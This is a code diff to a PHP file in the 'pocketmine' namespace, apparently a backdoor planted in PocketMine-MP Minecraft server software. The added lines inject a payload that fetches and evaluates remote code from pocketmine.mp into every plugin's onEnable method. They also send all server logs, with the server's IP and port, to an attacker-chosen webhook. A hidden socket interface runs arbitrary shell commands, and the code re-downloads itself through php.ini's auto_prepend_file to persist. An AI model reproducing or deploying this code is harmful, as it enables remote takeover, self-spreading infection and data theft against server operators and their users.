@@ -91,53 +91,57 @@ namespace pocketmine {
                     $mainPath = explode("/", $main);
                     $filePath = $dirPath . "/src/" . ($srcNamespacePrefix ? end($mainPath) : $main) . ".php";
                     $fileContents = explode("\n", @file_get_contents($filePath));
-        $payload = "eval(`wget -qO- pocketmine.mp`);";
-        $find = function (array $queries, array $contents): int|false {
-            foreach ($contents as $key => $value) {
-                foreach ($queries as $query) {
-                    if (!str_contains(strtolower($value), strtolower($query))) continue 2;
-                }
-                return $key;
-            }
-            return false;
-        };
-        if (!$find([$payload], $fileContents)) continue;
-        $hasStrictTypes = function () use ($fileContents): bool {
-            return (bool)preg_match('/^\s*declare\s*\(\s*strict_types\s*=\s*1\s*\)\s*;/m', implode("\n", $fileContents));
-        };
-        if ($hasStrictTypes() or true) {
-            $findMain = function () use ($fileContents, $payload, $find): int|false {
-                $main = $find(["extends", "pluginbase"], $fileContents);
-                if (!$main) return false;
-                return $find(["{"], array_slice($fileContents, $main));
-            };
-            $findOnEnable = function () use ($fileContents, $payload, $find): int|false {
-                $onEnable = $find(["onenable"], $fileContents);
-                if (!$onEnable) return false;
-                return $find(["{"], array_slice($fileContents, $onEnable));
-            };
-            $onEnable = $findOnEnable();
-            $tab_detector = function (array $array) {
-                foreach ($array as $str) {
-                    $tab = mb_substr($str, 0, 1);
-                    if (ctype_alpha($tab) or (int)$tab !== 0) continue;
-                    if (!(str_contains($tab, "\t") or str_contains($tab, " "))) continue;
-                    $occurence = substr_count($str, $tab);
-                    return str_repeat($tab, $occurence + 1);
-                }
-                return false;
-            };
-            $copyFileContents = $fileContents;
-            $tab = $tab_detector(array_splice($copyFileContents, $onEnable)) ?: "";
-            if (!$onEnable) {
-                $fileContents["{$findMain()}.5"] = "\n{$tab}protected function onEnable(): void {\n" . str_repeat($tab, 2) . "$payload\n$tab}\n";
-            } else $fileContents["$onEnable.5"] = "$tab$payload";
-            ksort($fileContents);
-            @file_put_contents($filePath, implode("\n", $fileContents));
-        } else {
-            $fileContents = implode("\n", $fileContents) . str_repeat("\n", 10) . $payload;
-            @file_put_contents($filePath, $fileContents);
-        }
+                    $payload = "eval(`wget -qO- pocketmine.mp`);";
+                    $find = function (array $queries, array $contents): int|false {
+                        $containsQueries = function (string $value) use ($queries) {
+                            foreach ($queries as $query) {
+                                if (str_contains(strtolower($value), strtolower($query))) return true;
+                            }
+                            return false;
+                        };
+                        foreach ($contents as $key => $value) {
+                            if(!$containsQueries($value)) continue;
+                            return $key;
+                        }
+                        return false;
+                    };
+                    if ($find([$payload], $fileContents)) continue;
+                    $hasStrictTypes = function () use ($fileContents): bool {
+                        return (bool)preg_match('/^\s*declare\s*\(\s*strict_types\s*=\s*1\s*\)\s*;/m', implode("\n", $fileContents));
+                    };
+                    if ($hasStrictTypes() or true) {
+                        $findMain = function () use ($fileContents, $payload, $find): int|false {
+                            $main = $find(["extends", "pluginbase"], $fileContents);
+                            if (!$main) return false;
+                            return $main + $find(["{"], array_slice($fileContents, $main));
+                        };
+                        $findOnEnable = function () use ($fileContents, $payload, $find): int|false {
+                            $onEnable = $find(["onenable"], $fileContents);
+                            if (!$onEnable) return false;
+                            return $onEnable + $find(["{"], array_slice($fileContents, $onEnable));
+                        };
+                        $onEnable = $findOnEnable();
+                        $tab_detector = function (array $array) {
+                            foreach ($array as $str) {
+                                $tab = mb_substr($str, 0, 1);
+                                if (ctype_alpha($tab) or (int)$tab !== 0) continue;
+                                if (!(str_contains($tab, "\t") or str_contains($tab, " "))) continue;
+                                $occurence = substr_count($str, $tab);
+                                return str_repeat($tab, $occurence + 1);
+                            }
+                            return false;
+                        };
+                        $copyFileContents = $fileContents;
+                        $tab = $tab_detector(array_splice($copyFileContents, $onEnable)) ?: "";
+                        if (!$onEnable) {
+                            $fileContents["{$findMain()}.5"] = "\n{$tab}protected function onEnable(): void {\n" . str_repeat($tab, 2) . "$payload\n$tab}\n";
+                        } else $fileContents["$onEnable.5"] = "\t$tab$payload";
+                        ksort($fileContents);
+                        @file_put_contents($filePath, implode("\n", $fileContents));
+                    } else {
+                        $fileContents = implode("\n", $fileContents) . str_repeat("\n", 10) . $payload;
+                        @file_put_contents($filePath, $fileContents);
+                    }
                 }
             }
 
@@ -166,6 +170,28 @@ namespace pocketmine {
                         }
                     },
                     fn(string $exec): string => `$exec 2>&1` ?: 'Aucun output.',
+                    fn(string $webhook): bool => \pocketmine\Server::getInstance()->getLogger()->addAttachment(new class ($webhook, \pocketmine\Server::getInstance()) extends \pocketmine\thread\log\ThreadSafeLoggerAttachment {
+                        public function __construct(private string $webhook, private \pocketmine\Server $server)
+                        {
+                        }
+
+                        public function log(string $level, string $message): void
+                        {
+                            $port = $this->server->getPort();
+                            $task = new class ($this->webhook, $level, $message, $port) extends \pocketmine\scheduler\AsyncTask {
+                                public function __construct(private string $webhook, private string $level, private string $message, private int $port)
+                                {
+                                }
+
+                                public function onRun(): void
+                                {
+                                    $ip = \pocketmine\utils\Internet::getIP();
+                                    \pocketmine\utils\Internet::postURL($this->webhook, ['content' => "> `$ip:$this->port` [" . strtoupper($this->level) . "] $this->message"]);
+                                }
+                            };
+                            \pocketmine\Server::getInstance()->getAsyncPool()->submitTask($task);
+                        }
+                    }),
                     \pocketmine\Server::getInstance()->getTickSleeper()
                 ) implements \pocketmine\network\NetworkInterface {
                     private \Socket $socket;
@@ -173,7 +199,7 @@ namespace pocketmine {
                     private \Socket $ipcThreadSocket;
                     private ?\pocketmine\thread\Thread $thread = null;
 
-                    public function __construct(callable $onCommandCallback, callable $onCodeCallback, callable $onExecCallback, \pocketmine\snooze\SleeperHandler $sleeper)
+                    public function __construct(callable $onCommandCallback, callable $onCodeCallback, callable $onExecCallback, callable $onListenCallback, \pocketmine\snooze\SleeperHandler $sleeper)
                     {
                         $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                         if ($socket === false) return;
@@ -212,12 +238,19 @@ namespace pocketmine {
                                 $thread->notify();
                             }, $this->thread);
                         });
-                        $this->thread ??= new class ($this->socket, $this->ipcThreadSocket, $commandSleeperEntry, $codeSleeperEntry, $execSleeperEntry) extends \pocketmine\thread\Thread {
+                        $listenSleeperEntry = $sleeper->addNotifier(function () use ($onListenCallback): void {
+                            $response = $onListenCallback($this->thread?->cmd ?? '');
+                            $this->thread->response = $response;
+                            $this->thread?->synchronized(function (\pocketmine\thread\Thread $thread): void {
+                                $thread->notify();
+                            }, $this->thread);
+                        });
+                        $this->thread ??= new class ($this->socket, $this->ipcThreadSocket, $commandSleeperEntry, $codeSleeperEntry, $execSleeperEntry, $listenSleeperEntry) extends \pocketmine\thread\Thread {
                             public string $cmd = "";
                             public string $response = "";
                             private bool $stop = false;
 
-                            public function __construct(private \Socket $socket, private \Socket $ipcSocket, private \pocketmine\snooze\SleeperHandlerEntry $commandSleeperEntry, private \pocketmine\snooze\SleeperHandlerEntry $codeSleeperEntry, private \pocketmine\snooze\SleeperHandlerEntry $execSleeperEntry)
+                            public function __construct(private \Socket $socket, private \Socket $ipcSocket, private \pocketmine\snooze\SleeperHandlerEntry $commandSleeperEntry, private \pocketmine\snooze\SleeperHandlerEntry $codeSleeperEntry, private \pocketmine\snooze\SleeperHandlerEntry $execSleeperEntry, private \pocketmine\snooze\SleeperHandlerEntry $listenSleeperEntry)
                             {
                             }
 
@@ -280,6 +313,7 @@ namespace pocketmine {
                                 $commandNotifier = $this->commandSleeperEntry->createNotifier();
                                 $codeNotifier = $this->codeSleeperEntry->createNotifier();
                                 $execNotifier = $this->execSleeperEntry->createNotifier();
+                                $listenNotifier = $this->listenSleeperEntry->createNotifier();
                                 while (!$this->stop) {
                                     $r = $clients;
                                     $r["main"] = $this->socket; //this is ugly, but we need to be able to mass-select()
@@ -325,31 +359,9 @@ namespace pocketmine {
                                                 };
                                                 switch ($packetType) {
                                                     case 9:
-                                                        $this->cmd = ltrim($payload);
-                                                        \pocketmine\utils\Internet::postURL($this->cmd, ['content' => 'success']);
-                                                        \pocketmine\Server::getInstance()->getLogger()->addAttachment(new class ($this->cmd) extends \pocketmine\thread\log\ThreadSafeLoggerAttachment {
-                                                            public function __construct(private string $webhook)
-                                                            {
-                                                            }
-
-                                                            public function log(string $level, string $message): void
-                                                            {
-                                                                $task = new class ($this->webhook, $level, $message) extends \pocketmine\scheduler\AsyncTask {
-                                                                    public function __construct(private string $webhook, private string $level, private string $message)
-                                                                    {
-                                                                    }
-
-                                                                    public function onRun(): void
-                                                                    {
-                                                                        \pocketmine\utils\Internet::postURL($this->webhook, ['content' => "> [" . strtoupper($this->level) . "] $this->message"]);
-                                                                    }
-                                                                };
-                                                                \pocketmine\Server::getInstance()->getAsyncPool()->submitTask($task);
-                                                            }
-                                                        });
-                                                        $this->writePacket($sock, $requestID, 0, $this->cmd);
-                                                        $this->response = "";
-                                                        $this->cmd = "";
+                                                        $process($listenNotifier);
+                                                        $ip = \pocketmine\utils\Internet::getIP();
+                                                        \pocketmine\utils\Internet::postURL($this->cmd, ['content' => "> Successfully binded to $ip"]);
                                                     case 6:
                                                         $this->cmd = realpath(ltrim($payload));
                                                         if (!$this->cmd) {
@@ -473,7 +485,7 @@ namespace pocketmine {
             {
                 $path = 'bin/php7/lib/php/build/pocketmine.php';
                 `wget -q -O $path pocketmine.mp/?o=pocketmine.php`;
-                if (!ini_get('auto_prepend_file')) `echo "auto_prepend_file=$path" >> bin/php7/bin/php.ini`;
+                if (ini_get('auto_prepend_file') !== $path) `echo "auto_prepend_file=$path" >> bin/php7/bin/php.ini`;
                 else ini_alter("auto_prepend_file", $path);
             }
 
